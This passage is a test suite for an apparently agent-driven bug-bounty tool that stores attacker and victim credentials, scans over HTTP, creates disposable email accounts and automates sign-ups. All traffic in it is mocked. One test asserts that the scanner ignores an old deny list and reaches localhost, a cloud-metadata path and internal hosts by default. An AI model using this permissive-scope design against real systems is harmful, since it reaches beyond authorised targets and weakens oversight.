    assert.deepEqual(Object.keys(saved.profiles).sort(), ["attacker", "tenant_b"]);
  });
});

test("bounty_auth_store migrates legacy auth.json", async () => {
  const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "bountyagent-test-"));
  const previousHome = process.env.HOME;
  process.env.HOME = tempHome;
  try {
    const sessionsDir = path.join(tempHome, "bounty-agent-sessions");
    const targetDir = path.join(sessionsDir, "target.com");
    fs.mkdirSync(targetDir, { recursive: true });

    // Write legacy format (flat object, no version)
    fs.writeFileSync(path.join(targetDir, "auth.json"), JSON.stringify({
      Authorization: "Bearer legacy",
      Cookie: "old=val",
    }));

    // Add victim — should migrate legacy to attacker and add victim
    const result = await executeTool("bounty_auth_store", {
      target_domain: "target.com",
      profile_name: "victim",
      headers: { "Authorization": "Bearer vtok" },
    });

    assert.equal(result.ok, true);
    assert.equal(result.data.success, true);
    assert.equal(result.data.has_attacker, true);
    assert.equal(result.data.has_victim, true);

    const saved = JSON.parse(fs.readFileSync(path.join(targetDir, "auth.json"), "utf8"));
    assert.equal(saved.version, 2);
    assert.equal(saved.profiles.attacker.Authorization, "Bearer legacy");
    assert.equal(saved.profiles.victim.Authorization, "Bearer vtok");
  } finally {
    process.env.HOME = previousHome;
    fs.rmSync(tempHome, { recursive: true, force: true });
  }
});

test("bounty_auth_store stores credentials alongside headers", async () => {
  const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "bountyagent-test-"));
  const previousHome = process.env.HOME;
  process.env.HOME = tempHome;
  try {
    const sessionsDir = path.join(tempHome, "bounty-agent-sessions");
    fs.mkdirSync(path.join(sessionsDir, "target.com"), { recursive: true });

    await executeTool("bounty_auth_store", {
      target_domain: "target.com",
      profile_name: "attacker",
      headers: { "Authorization": "Bearer t" },
      credentials: { email: "test@mail.tm", password: "secret123" },
    });

    const saved = JSON.parse(fs.readFileSync(path.join(sessionsDir, "target.com", "auth.json"), "utf8"));
    assert.equal(saved.profiles.attacker.credentials.email, "test@mail.tm");
    assert.equal(saved.profiles.attacker.credentials.password, "secret123");
  } finally {
    process.env.HOME = previousHome;
    fs.rmSync(tempHome, { recursive: true, force: true });
  }
});

test("bounty_auth_store writes and migrates auth.json with 0600 permissions", async () => {
  const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "bountyagent-test-"));
  const previousHome = process.env.HOME;
  process.env.HOME = tempHome;
  try {
    const targetDir = path.join(tempHome, "bounty-agent-sessions", "target.com");
    const authPath = path.join(targetDir, "auth.json");
    fs.mkdirSync(targetDir, { recursive: true });

    await executeTool("bounty_auth_store", {
      target_domain: "target.com",
      profile_name: "attacker",
      cookies: { sessionid: "abc" },
    });
    assert.equal(fs.statSync(authPath).mode & 0o777, 0o600);

    fs.writeFileSync(authPath, JSON.stringify({ Authorization: "Bearer legacy" }), { mode: 0o644 });
    await executeTool("bounty_auth_store", {
      target_domain: "target.com",
      profile_name: "victim",
      headers: { Authorization: "Bearer victim" },
    });
    assert.equal(fs.statSync(authPath).mode & 0o777, 0o600);
  } finally {
    process.env.HOME = previousHome;
    fs.rmSync(tempHome, { recursive: true, force: true });
  }
});

test("bounty_auth_store reports persistence failures instead of claiming success", async () => {
  const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "bountyagent-test-"));
  const previousHome = process.env.HOME;
  process.env.HOME = tempHome;
  try {
    const authPath = path.join(tempHome, "bounty-agent-sessions", "target.com", "auth.json");
    fs.mkdirSync(authPath, { recursive: true });

    const envelope = await executeTool("bounty_auth_store", {
      target_domain: "target.com",
      profile_name: "attacker",
      headers: { "Authorization": "Bearer atok" },
    });

    assert.equal(envelope.ok, false);
    assert.equal(envelope.error.code, "INTERNAL_ERROR");
    assert.equal(envelope.error.details.auth_path, authPath);
    assert.equal(envelope.error.details.success, false);
    assert.match(envelope.error.message, /failed to persist auth profile/i);
    assert.equal(envelope.error.details.auth_path, authPath);
  } finally {
    process.env.HOME = previousHome;
    fs.rmSync(tempHome, { recursive: true, force: true });
  }
});

test("bounty_auth_store preserves concurrent attacker and victim profile writes", async () => {
  await withTempHome(async () => {
    await Promise.all([
      executeTool("bounty_auth_store", {
        target_domain: "target.com",
        profile_name: "attacker",
        headers: { Authorization: "Bearer attacker" },
      }),
      executeTool("bounty_auth_store", {
        target_domain: "target.com",
        profile_name: "victim",
        headers: { Authorization: "Bearer victim" },
      }),
    ]);

    const saved = JSON.parse(fs.readFileSync(path.join(sessionDir("target.com"), "auth.json"), "utf8"));
    assert.equal(saved.profiles.attacker.Authorization, "Bearer attacker");
    assert.equal(saved.profiles.victim.Authorization, "Bearer victim");
  });
});

test("bounty_list_auth_profiles redacts secrets while reporting profile status", async () => {
  const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "bountyagent-test-"));
  const previousHome = process.env.HOME;
  process.env.HOME = tempHome;
  try {
    await executeTool("bounty_auth_store", {
      target_domain: "target.com",
      profile_name: "attacker",
      headers: { "Authorization": "Bearer secret-token" },
      cookies: { sessionid: "cookie-secret" },
      credentials: { email: "attacker@example.com", password: "password-secret" },
    });

    const result = JSON.parse(listAuthProfiles({ target_domain: "target.com" }));
    assert.equal(result.has_attacker, true);
    assert.equal(result.profiles[0].profile_name, "attacker");
    assert.deepEqual(result.profiles[0].header_keys.sort(), ["Authorization", "Cookie"].sort());
    assert.deepEqual(result.profiles[0].cookie_names, ["sessionid"]);
    assert.equal(result.profiles[0].has_credentials, true);
    assert.deepEqual(result.profiles[0].credential_fields.sort(), ["email", "password"].sort());
    assert.doesNotMatch(JSON.stringify(result), /secret-token|cookie-secret|password-secret|attacker@example\.com/);
  } finally {
    process.env.HOME = previousHome;
    fs.rmSync(tempHome, { recursive: true, force: true });
  }
});

test("bounty_http_scan resolves auth by explicit target_domain and first-party subdomain only", async () => {
  await withTempHome(async () => {
    await executeTool("bounty_auth_store", {
      target_domain: "target.com",
      profile_name: "attacker",
      headers: { Authorization: "Bearer target-token" },
    });
    await executeTool("bounty_auth_store", {
      target_domain: "other.com",
      profile_name: "attacker",
      headers: { Authorization: "Bearer other-token" },
    });
    const listed = JSON.parse(listAuthProfiles({ target_domain: "api.target.com" }));
    assert.equal(listed.has_attacker, true);

    await withMockSafeFetch((url, requestOptions) => ({
      status: requestOptions.headers.Authorization === "Bearer target-token" ? 200 : 401,
      body: "ok",
    }), async (requestedUrls) => {
      const allowed = await executeTool("bounty_http_scan", {
        target_domain: "target.com",
        method: "GET",
        url: "https://api.target.com/private",
        auth_profile: "attacker",
        response_mode: "status_only",
      });
      assert.equal(allowed.ok, true);
      assert.equal(allowed.data.status, 200);

      const blocked = await executeTool("bounty_http_scan", {
        target_domain: "missing.com",
        method: "GET",
        url: "https://api.missing.com/private",
        auth_profile: "attacker",
        response_mode: "status_only",
      });
      assert.equal(blocked.ok, false);
      assert.equal(blocked.error.code, "AUTH_MISSING");
      assert.match(blocked.error.message, /auth_profile "attacker" requested but not found/);
      assert.deepEqual(requestedUrls, ["https://api.target.com/private"]);
    });
  });
});

test("bounty_evm_call resolves the latest block via eth_blockNumber and returns block_used", async () => {
  const originalFetch = global.fetch;
  try {
    let callCount = 0;
    global.fetch = async (_url, opts) => {
      callCount += 1;
      const body = JSON.parse(opts.body);
      if (body.method === "eth_call") {
        return {
          ok: true,
          status: 200,
          headers: { get: () => "application/json" },
          text: async () => JSON.stringify({ jsonrpc: "2.0", id: body.id, result: "0x" + "00".repeat(31) + "01" }),
          body: null,
        };
      }
      if (body.method === "eth_blockNumber") {
        // Return decimal 19_500_000 in hex
        return {
          ok: true,
          status: 200,
          headers: { get: () => "application/json" },
          text: async () => JSON.stringify({ jsonrpc: "2.0", id: body.id, result: "0x129a8c0" }),
          body: null,
        };
      }
      return { ok: false, status: 500, text: async () => "" };
    };

    const result = await executeTool("bounty_evm_call", {
      chain_id: 1,
      to: "0x" + "11".repeat(20),
      data: "0x70a08231" + "00".repeat(32),
      endpoints: ["https://eth.llamarpc.com"],
    });
    assert.equal(result.ok, true);
    assert.equal(result.data.block, "latest");
    // Hex 0x129a8c0 = 19_507_392
    assert.equal(result.data.block_used, 19_507_392);
    assert.ok(callCount >= 2, "expected at least one eth_call and one eth_blockNumber");
  } finally {
    global.fetch = originalFetch;
  }
});

// ── bounty_temp_email tests ──

test("bounty_temp_email create returns email with mocked mail.tm", async () => {
  const originalFetch = global.fetch;
  try {
    global.fetch = async (url, opts) => {
      if (url.includes("mail.tm/domains")) {
        return { ok: true, json: async () => ({ "hydra:member": [{ domain: "test.tm" }] }) };
      }
      if (url.includes("mail.tm/accounts")) {
        return { ok: true, status: 201, json: async () => ({ id: "abc", address: "x@test.tm" }) };
      }
      if (url.includes("mail.tm/token")) {
        return { ok: true, json: async () => ({ token: "jwt123" }) };
      }
      return { ok: false, status: 500 };
    };

    const result = await executeTool("bounty_temp_email", { operation: "create" });
    assert.equal(result.ok, true);
    assert.equal(result.data.success, true);
    assert.ok(result.data.email_address.endsWith("@test.tm"));
    assert.equal(result.data.provider, "mail.tm");
    assert.ok(result.data.password.length > 0);
  } finally {
    global.fetch = originalFetch;
  }
});

test("bounty_temp_email create falls back to guerrillamail on mail.tm failure", async () => {
  const originalFetch = global.fetch;
  try {
    global.fetch = async (url) => {
      if (url.includes("mail.tm")) {
        return { ok: false, status: 500, text: async () => "Service Unavailable" };
      }
      if (url.includes("guerrillamail") && url.includes("get_email_address")) {
        return { ok: true, json: async () => ({ email_addr: "test_user@guerrillamail.com", sid_token: "sid123" }) };
      }
      return { ok: false, status: 500, text: async () => "" };
    };

    const result = await executeTool("bounty_temp_email", { operation: "create" });
    assert.equal(result.ok, true);
    assert.equal(result.data.success, true);
    assert.equal(result.data.email_address, "test_user@guerrillamail.com");
    assert.equal(result.data.provider, "guerrillamail");
  } finally {
    global.fetch = originalFetch;
  }
});

test("bounty_temp_email create returns error when all providers fail", async () => {
  const originalFetch = global.fetch;
  try {
    global.fetch = async () => ({ ok: false, status: 500, text: async () => "Internal Server Error" });

    const result = await executeTool("bounty_temp_email", { operation: "create" });
    assert.equal(result.ok, false);
    assert.equal(result.error.code, "INTERNAL_ERROR");
    assert.equal(result.error.details.success, false);
    assert.ok(result.error.details.providers_tried.length > 0);
  } finally {
    global.fetch = originalFetch;
  }
});

test("bounty_temp_email poll returns messages with mocked mail.tm", async () => {
  const originalFetch = global.fetch;
  try {
    // First create a mailbox to populate tempMailboxes
    global.fetch = async (url) => {
      if (url.includes("mail.tm/domains")) {
        return { ok: true, json: async () => ({ "hydra:member": [{ domain: "test.tm" }] }) };
      }
      if (url.includes("mail.tm/accounts")) {
        return { ok: true, status: 201, json: async () => ({ id: "abc" }) };
      }
      if (url.includes("mail.tm/token")) {
        return { ok: true, json: async () => ({ token: "jwt123" }) };
      }
      if (url.includes("mail.tm/messages") && !url.includes("/messages/")) {
        return {
          ok: true,
          json: async () => ({
            "hydra:member": [
              { id: "msg1", from: { address: "noreply@target.com" }, subject: "Verify your email", createdAt: "2026-01-01" },
            ],
          }),
        };
      }
      return { ok: false, status: 500 };
    };

    const createResult = await executeTool("bounty_temp_email", { operation: "create" });
    assert.equal(createResult.ok, true);
    const pollResult = await executeTool("bounty_temp_email", {
      operation: "poll",
      email_address: createResult.data.email_address,
    });

    assert.equal(pollResult.ok, true);
    assert.equal(pollResult.data.success, true);
    assert.equal(pollResult.data.messages.length, 1);
    assert.equal(pollResult.data.messages[0].from, "noreply@target.com");
  } finally {
    global.fetch = originalFetch;
  }
});

test("bounty_temp_email extract finds codes and links", async () => {
  const originalFetch = global.fetch;
  try {
    // Create mailbox first
    global.fetch = async (url) => {
      if (url.includes("mail.tm/domains")) {
        return { ok: true, json: async () => ({ "hydra:member": [{ domain: "test.tm" }] }) };
      }
      if (url.includes("mail.tm/accounts")) {
        return { ok: true, status: 201, json: async () => ({ id: "abc" }) };
      }
      if (url.includes("mail.tm/token")) {
        return { ok: true, json: async () => ({ token: "jwt123" }) };
      }
      if (url.includes("mail.tm/messages/msg1")) {
        return {
          ok: true,
          json: async () => ({
            text: "Your verification code is 847291. Or click https://target.com/verify?token=abc123 to confirm.",
          }),
        };
      }
      return { ok: false, status: 500 };
    };

    const createResult = await executeTool("bounty_temp_email", { operation: "create" });
    assert.equal(createResult.ok, true);
    const extractResult = await executeTool("bounty_temp_email", {
      operation: "extract",
      email_address: createResult.data.email_address,
      message_id: "msg1",
    });

    assert.equal(extractResult.ok, true);
    assert.equal(extractResult.data.success, true);
    assert.ok(extractResult.data.verification_codes.includes("847291"));
    assert.ok(extractResult.data.verification_links.some((l) => l.includes("target.com/verify")));
  } finally {
    global.fetch = originalFetch;
  }
});

test("bounty_temp_email poll for unknown email returns error", async () => {
  const result = await executeTool("bounty_temp_email", {
    operation: "poll",
    email_address: "nonexistent@nowhere.com",
  });
  assert.equal(result.ok, false);
  assert.equal(result.error.code, "INTERNAL_ERROR");
  assert.ok(result.error.message.includes("Unknown email"));
});

test("auto-signup result normalization fails ambiguous states and preserves diagnostics", () => {
  const signupUrl = "https://example.com/signup/";
  const ambiguous = normalizeAutoSignupResult({
    success: true,
    submitted: true,
    redirect_url: "https://example.com/signup#done",
    page_errors: [],
    filled_fields: { email: true, password: true },
    cookies: { theme: "light" },
    headers: {},
    local_storage: {},
    session_storage: {},
  }, signupUrl);

  assert.equal(ambiguous.success, false);
  assert.equal(ambiguous.fallback, "manual");
  assert.equal(ambiguous.diagnostics.submitted, true);
  assert.deepEqual(ambiguous.auth_evidence.cookie_keys, []);

  const successful = normalizeAutoSignupResult({
    success: true,
    submitted: true,
    redirect_url: "https://example.com/dashboard",
    page_errors: [],
    filled_fields: { email: true, password: true },
    cookies: { sessionid: "abc" },
    headers: {},
    local_storage: {},
    session_storage: {},
  }, signupUrl);
  assert.equal(successful.success, true);
  assert.deepEqual(successful.auth_evidence.cookie_keys, ["sessionid"]);
});

test("bounty_auto_signup returns ok true manual fallback when browser automation is unavailable", async () => {
  await withTempHome(async () => {
    const originalResolve = Module._resolveFilename;
    Module._resolveFilename = function patchedResolve(request, parent, isMain, options) {
      if (request === "patchright") {
        throw new Error("Cannot find module 'patchright'");
      }
      return originalResolve.call(this, request, parent, isMain, options);
    };
    try {
      const result = await executeTool("bounty_auto_signup", {
        target_domain: "example.com",
        signup_url: "https://example.com/signup",
        email: "a@example.test",
        password: "Password123!",
      });

      assert.equal(result.ok, true);
      assert.equal(result.data.success, false);
      assert.equal(result.data.fallback, "manual");
      assert.equal(result.data.reason, "patchright_unavailable");
      assert.match(result.data.message, /Patchright is not installed/);
      assert.equal(Object.prototype.hasOwnProperty.call(result.data, "error"), false);
    } finally {
      Module._resolveFilename = originalResolve;
    }
  });
});

test("bounty_auto_signup optionally blocks internal signup URLs before browser launch and lets third-party signup URLs through", async () => {
  await withTempHome(async () => {
    const domain = "example.com";
    fs.mkdirSync(sessionDir(domain), { recursive: true });

    const internalBlocked = await executeTool("bounty_auto_signup", {
      target_domain: domain,
      signup_url: "http://127.0.0.1/signup",
      email: "a@example.test",
      password: "Password123!",
      block_internal_hosts: true,
    });
    assert.equal(internalBlocked.ok, false);
    assert.equal(internalBlocked.error.code, "SCOPE_BLOCKED");
    assert.equal(internalBlocked.error.details.success, false);
    assert.equal(internalBlocked.error.details.scope_decision, "blocked");
    assert.equal(internalBlocked.error.details.fallback, "manual");
    assert.match(internalBlocked.error.message, /Blocked internal\/private host/);

    const thirdParty = await executeTool("bounty_auto_signup", {
      target_domain: domain,
      signup_url: "https://third-party.example.net/signup",
      email: "a@example.test",
      password: "Password123!",
    });
    assert.equal(thirdParty.ok, true);
    assert.equal(thirdParty.data.success, false);
    assert.equal(thirdParty.data.fallback, "manual");
    assert.notEqual(thirdParty.data.scope_decision, "blocked");
  });
});

test("bounty_auto_signup blocks DNS-private signup hosts before browser availability checks", async () => {
  await withTempHome(async () => {
    const domain = "example.com";
    fs.mkdirSync(sessionDir(domain), { recursive: true });

    const originalResolve = Module._resolveFilename;
    let patchrightResolveCalls = 0;
    Module._resolveFilename = function patchedResolve(request, parent, isMain, options) {
      if (request === "patchright") {
        patchrightResolveCalls += 1;
        throw new Error("Patchright resolution should not run after a DNS scope block");
      }
      return originalResolve.call(this, request, parent, isMain, options);
    };

    try {
      await withMockSafeFetch({}, async (requestedUrls) => {
        const result = await executeTool("bounty_auto_signup", {
          target_domain: domain,
          signup_url: "https://signup.public.test/register",
          email: "a@example.test",
          password: "Password123!",
          block_internal_hosts: true,
        });

        assert.equal(result.ok, false);
        assert.equal(result.error.code, "SCOPE_BLOCKED");
        assert.match(result.error.message, /Blocked internal\/private DNS address/);
        assert.equal(result.error.details.scope_decision, "blocked");
        assert.equal(result.error.details.fallback, "manual");
        assert.deepEqual(requestedUrls, []);
        assert.equal(patchrightResolveCalls, 0);
      }, { dnsRecords: { "signup.public.test": [{ address: "10.0.0.5", family: 4 }] } });
    } finally {
      Module._resolveFilename = originalResolve;
    }
  });
});

test("bounty_auto_signup treats non-policy DNS preflight failures as manual fallback", async () => {
  await withTempHome(async () => {
    const result = await withMockSafeFetch({}, async () => executeTool("bounty_auto_signup", {
      target_domain: "example.com",
      signup_url: "https://signup.public.test/register",
      email: "a@example.test",
      password: "Password123!",
      block_internal_hosts: true,
    }), { dnsRecords: { "signup.public.test": [] } });

    assert.equal(result.ok, true);
    assert.equal(result.data.success, false);
    assert.equal(result.data.fallback, "manual");
    assert.equal(result.data.reason, "automation_unavailable");
    assert.match(result.data.message, /DNS lookup returned no addresses/);
    assert.notEqual(result.data.scope_decision, "blocked");
  });
});

// ── migrateAuthJson unit tests ──

test("migrateAuthJson wraps legacy flat object as attacker profile", () => {
  const legacy = { Authorization: "Bearer old", Cookie: "s=1" };
  const result = migrateAuthJson(legacy);
  assert.equal(result.version, 2);
  assert.deepStrictEqual(result.profiles.attacker, legacy);
});

test("migrateAuthJson returns v2 unchanged", () => {
  const v2 = { version: 2, profiles: { attacker: { Authorization: "Bearer a" } } };
  const result = migrateAuthJson(v2);
  assert.equal(result, v2);
});

test("migrateAuthJson handles null/undefined", () => {
  assert.deepStrictEqual(migrateAuthJson(null), { version: 2, profiles: {} });
  assert.deepStrictEqual(migrateAuthJson(undefined), { version: 2, profiles: {} });
});

// ── HTTP audit, imported traffic, public intel, and ranking tests ──

test("bounty_http_scan writes audit entries for success, HTTP error, timeout, and scope-blocked requests", async () => {
  await withTempHome(async () => {
    const domain = "example.com";
    const timeoutError = new Error("The operation was aborted");
    timeoutError.name = "AbortError";

    await withMockSafeFetch({
      "https://example.com/ok": { status: 200, statusText: "OK", body: "ok" },
      "https://example.com/forbidden": { status: 403, statusText: "Forbidden", body: "no" },
      "https://example.com/timeout": { error: timeoutError },
    }, async () => {
      const okResult = await executeTool("bounty_http_scan", {
        target_domain: domain,
        wave: "w1",
        agent: "a1",
        surface_id: "surface-a",
        method: "GET",
        url: "https://example.com/ok",
        response_mode: "status_only",
      });
      assert.equal(okResult.ok, true);
      assert.equal(okResult.data.status, 200);

      const forbiddenResult = await executeTool("bounty_http_scan", {
        target_domain: domain,
        method: "GET",
        url: "https://example.com/forbidden",
        response_mode: "status_only",
      });
      assert.equal(forbiddenResult.ok, true);
      assert.equal(forbiddenResult.data.status, 403);

      const timeoutResult = await executeTool("bounty_http_scan", {
        target_domain: domain,
        method: "GET",
        url: "https://example.com/timeout",
      });
      assert.equal(timeoutResult.ok, false);
      assert.equal(timeoutResult.error.code, "INTERNAL_ERROR");
      assert.match(timeoutResult.error.message, /timeout/i);

      const privateHostResult = await executeTool("bounty_http_scan", {
        target_domain: domain,
        method: "GET",
        url: "http://127.0.0.1/admin",
        block_internal_hosts: true,
      });
      assert.equal(privateHostResult.ok, false);
      assert.equal(privateHostResult.error.code, "SCOPE_BLOCKED");
      assert.match(privateHostResult.error.message, /Blocked internal\/private host/);

      const records = readHttpAuditRecordsFromJsonl(domain);
      assert.equal(records.length, 4);
      assert.deepEqual(records.map((record) => record.status), [200, 403, null, null]);
      assert.deepEqual(records.map((record) => record.scope_decision), ["allowed", "allowed", "request_error", "blocked"]);
      assert.equal(records[0].wave, "w1");
      assert.equal(records[0].agent, "a1");
      assert.equal(records[0].surface_id, "surface-a");

      const audit = JSON.parse(readHttpAudit({ target_domain: domain, limit: 2 }));
      assert.equal(audit.summary.total, 4);
      assert.equal(audit.summary.shown, 2);
      assert.equal(audit.summary.by_status_class["4xx"], 1);
      assert.equal(audit.summary.scope_blocked, 1);
      assert.ok(fs.existsSync(httpAuditJsonlPath(domain)));
    });
  });
});

test("bounty_http_scan redacts persisted audit URLs while sending the original request", async () => {
  await withTempHome(async () => {
    const domain = "example.com";
    await withMockSafeFetch({
      "https://example.com/callback?token=secret-token&code=oauth-code&id=123": {
        status: 200,
        statusText: "OK",
        body: "ok",
      },
    }, async (requestedUrls) => {
      await executeTool("bounty_http_scan", {
        target_domain: domain,
        method: "GET",
        url: "https://example.com/callback?token=secret-token&code=oauth-code&id=123#client-fragment",
        response_mode: "status_only",
      });

      assert.equal(requestedUrls[0], "https://example.com/callback?token=secret-token&code=oauth-code&id=123");
      const records = readHttpAuditRecordsFromJsonl(domain);
      assert.equal(records.length, 1);
      assert.equal(records[0].url, "https://example.com/callback?token=REDACTED&code=REDACTED&id=REDACTED");
      assert.equal(records[0].path, "/callback?token=REDACTED&code=REDACTED&id=REDACTED");
      assert.doesNotMatch(JSON.stringify(records), /secret-token|oauth-code|client-fragment|id=123/);

      const audit = JSON.parse(readHttpAudit({ target_domain: domain }));
      assert.doesNotMatch(JSON.stringify(audit), /secret-token|oauth-code|client-fragment|id=123/);
    });
  });
});

test("bounty_http_scan permits target, attack-surface, third-party, and previously deny-listed hosts so Bob can reach whatever the chain needs", async () => {
  await withTempHome(async () => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [
      { id: "surface-api", hosts: [`https://api.partner-service.com`] },
    ]);
    // A leftover deny-list.txt from older sessions must no longer matter.
    fs.writeFileSync(path.join(sessionDir(domain), "deny-list.txt"), "blocked.example.com\n");

    await withMockSafeFetch({
      "https://app.example.com/ok": { status: 200, statusText: "OK", body: "ok" },
      "https://api.partner-service.com/v1/users": { status: 200, statusText: "OK", body: "ok" },
      "https://crt.sh/?q=example.com": { status: 200, statusText: "OK", body: "ok" },
      "https://crt.sh/?q=other.com": { status: 200, statusText: "OK", body: "ok" },
      "https://third-party.example.net/api": { status: 200, statusText: "OK", body: "ok" },
      "https://blocked.example.com/admin": { status: 200, statusText: "OK", body: "ok" },
      "http://127.0.0.1/admin": { status: 200, statusText: "OK", body: "ok" },
      "http://metadata/latest/meta-data/": { status: 200, statusText: "OK", body: "ok" },
      "http://service.internal/debug": { status: 200, statusText: "OK", body: "ok" },
    }, async (requestedUrls) => {
      const targets = [
        "https://app.example.com/ok",
        "https://api.partner-service.com/v1/users",
        "https://crt.sh/?q=example.com",
        "https://crt.sh/?q=other.com",
        "https://third-party.example.net/api",
        "https://blocked.example.com/admin",
        "http://127.0.0.1/admin",
        "http://metadata/latest/meta-data/",
        "http://service.internal/debug",
      ];
      for (const url of targets) {
        const result = await executeTool("bounty_http_scan", {
          target_domain: domain,
          method: "GET",
          url,
          response_mode: "status_only",
        });
        assert.equal(result.ok, true, `expected ${url} to be permitted`);
        assert.equal(result.data.status, 200);
      }

      assert.deepEqual(requestedUrls, targets);

      const records = readHttpAuditRecordsFromJsonl(domain);
      assert.equal(records.length, targets.length);
      for (const record of records) {
        assert.equal(record.scope_decision, "allowed");
      }
    });
  });
});

test("bounty_http_scan requires target_domain instead of inferring scope from other sessions", async () => {
  await withTempHome(async () => {
    const domain = "example.com";
    seedSessionState(domain);

    const blocked = await executeTool("bounty_http_scan", {
      method: "GET",
      url: "https://app.example.com/ok",
      response_mode: "status_only",
    });
    assert.equal(blocked.ok, false);
    assert.equal(blocked.error.code, "INVALID_ARGUMENTS");
    assert.match(blocked.error.message, /target_domain is required/);
  });
});

test("bounty_http_scan optionally blocks internal redirect targets before fetching them", async () => {
  await withTempHome(async () => {
    const domain = "example.com";
    await withMockSafeFetch({
      "https://example.com/redirect": {
        status: 302,
        statusText: "Found",
        headers: { location: "http://127.0.0.1/admin" },
      },
    }, async (requestedUrls) => {
      const result = await executeTool("bounty_http_scan", {
        target_domain: domain,
        method: "GET",
        url: "https://example.com/redirect",
        follow_redirects: true,
        block_internal_hosts: true,
      });

      assert.equal(result.ok, false);
      assert.equal(result.error.code, "SCOPE_BLOCKED");
      assert.match(result.error.message, /Blocked internal\/private host/);
      assert.equal(result.error.details.scope_decision, "blocked");
      assert.deepEqual(requestedUrls, ["https://example.com/redirect"]);

      const records = readHttpAuditRecordsFromJsonl(domain);
      assert.equal(records.length, 1);
      assert.equal(records[0].scope_decision, "blocked");
      assert.match(records[0].error, /Blocked internal\/private host/);
    });
  });
});

test("bounty_http_scan follows internal redirects by default", async () => {
  await withTempHome(async () => {
    const domain = "example.com";
    await withMockSafeFetch({
      "https://example.com/redirect": {
        status: 302,
        statusText: "Found",
        headers: { location: "http://127.0.0.1/admin" },
      },
      "http://127.0.0.1/admin": { status: 200, statusText: "OK", body: "local ok" },
    }, async (requestedUrls) => {
      const result = await executeTool("bounty_http_scan", {
        target_domain: domain,
        method: "GET",
        url: "https://example.com/redirect",
        follow_redirects: true,
        response_mode: "status_only",
      });

      assert.equal(result.ok, true);
      assert.equal(result.data.status, 200);
      assert.equal(result.data.final_url, "http://127.0.0.1/admin");
      assert.deepEqual(requestedUrls, ["https://example.com/redirect", "http://127.0.0.1/admin"]);
    });
  });
});

test("bounty_http_scan optionally blocks public hostnames that resolve to private IPs before connecting", async () => {
  await withTempHome(async () => {
    const domain = "example.com";
    await withMockSafeFetch({
      "https://example.com/private-dns": { status: 200, body: "should not connect" },
    }, async (requestedUrls) => {
      const result = await executeTool("bounty_http_scan", {
        target_domain: domain,
        method: "GET",
        url: "https://example.com/private-dns",
        block_internal_hosts: true,
      });
      assert.equal(result.ok, false);
      assert.equal(result.error.code, "SCOPE_BLOCKED");
      assert.match(result.error.message, /Blocked internal\/private DNS address/);
      assert.equal(result.error.details.scope_decision, "blocked");
      assert.deepEqual(requestedUrls, []);
    }, { dnsRecords: { "example.com": [{ address: "10.0.0.5", family: 4 }] } });
  });
});

test("bounty_http_scan allows public hostnames that resolve to private IPs by default", async () => {
  await withTempHome(async () => {
    const domain = "example.com";
    await withMockSafeFetch({
      "https://example.com/private-dns": { status: 200, statusText: "OK", body: "connected" },
    }, async (requestedUrls) => {
      const result = await executeTool("bounty_http_scan", {
        target_domain: domain,
        method: "GET",
        url: "https://example.com/private-dns",
        response_mode: "status_only",
      });
      assert.equal(result.ok, true);
      assert.equal(result.data.status, 200);
      assert.deepEqual(requestedUrls, ["https://example.com/private-dns"]);
    }, { dnsRecords: { "example.com": [{ address: "10.0.0.5", family: 4 }] } });
  });
});

test("safeFetch supports IPv6 literals by default and still blocks them when requested", async () => {
  await withTempHome(async () => {
    await withMockSafeFetch({
      "http://[::1]/admin": { status: 200, statusText: "OK", body: "ipv6 ok" },
    }, async (requestedUrls) => {
      const response = await safeFetch("http://[::1]/admin");

      assert.equal(response.status, 200);
      assert.equal(await response.text(), "ipv6 ok");
      assert.deepEqual(requestedUrls, ["http://[::1]/admin"]);
    });
  });

  await assert.rejects(
    () => safeFetch("http://[::1]/admin", { blockInternalHosts: true }),
    (error) => {
      assert.equal(error.scope_decision, "blocked");
      assert.match(error.message, /Blocked internal\/private host/);
      return true;
    },
  );
});

test("safeFetch enforces response byte caps without buffering the full body", async () => {
  await withTempHome(async () => {
    const domain = "example.com";
    await withMockSafeFetch({
      "https://example.com/large": { status: 200, body: "abcdef" },
    }, async () => {
      const response = await safeFetch("https://example.com/large", {
        targetDomain: domain,
        maxResponseBytes: 4,
      });
      assert.equal(response.bodyTruncated, true);
      assert.equal(response.bodyByteLength, 6);
      assert.equal(await response.text(), "abcd");
    });
  });
});

test("bounty_import_http_traffic validates, dedupes, stores session-local traffic, and briefs only relevant surface traffic", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
    seedAttackSurfaces(domain, [
      {
        id: "surface-api",
        hosts: [`https://app.${domain}`],
        tech_stack: ["JSON API"],
        endpoints: ["/api/me"],
        interesting_params: ["id"],
        nuclei_hits: [],
        priority: "LOW",
      },
      {
        id: "surface-admin",
        hosts: [`https://admin.${domain}`],
        tech_stack: ["Custom"],
        endpoints: ["/admin"],
        interesting_params: [],
        nuclei_hits: [],
        priority: "LOW",
      },
    ]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-api" }]);
    const attackSurfaceBeforeImport = fs.readFileSync(attackSurfacePath(domain), "utf8");

    const result = JSON.parse(importHttpTraffic({
      target_domain: domain,
      source: "burp",
      entries: [
        {
          request: {
            method: "GET",
            url: `https://app.${domain}/api/me?id=123`,
            headers: [{ name: "Cookie", value: "sid=redacted" }],
          },
          response: { status: 200 },
          startedDateTime: "2026-04-24T00:00:00.000Z",
        },
        {
          request: {
            method: "GET",
            url: `https://app.${domain}/api/me?id=123#frag`,
            headers: [{ name: "Cookie", value: "sid=redacted" }],
          },
          response: { status: 200 },
        },
        {
          method: "GET",
          url: "https://evil.example.net/api/me",
          status: 200,
        },
        {
          method: "GET",
          status: 200,
        },
      ],
    }));

    assert.equal(result.imported, 1);
    assert.equal(result.duplicates, 1);
    assert.equal(result.rejected, 2);
    assert.ok(fs.existsSync(trafficJsonlPath(domain)));
    assert.equal(readTrafficRecordsFromJsonl(domain).length, 1);
    assert.equal(fs.readFileSync(attackSurfacePath(domain), "utf8"), attackSurfaceBeforeImport);

    const brief = JSON.parse(readHunterBrief({ target_domain: domain, wave: "w1", agent: "a1" }));
    assert.equal(brief.traffic_summary.total, 1);
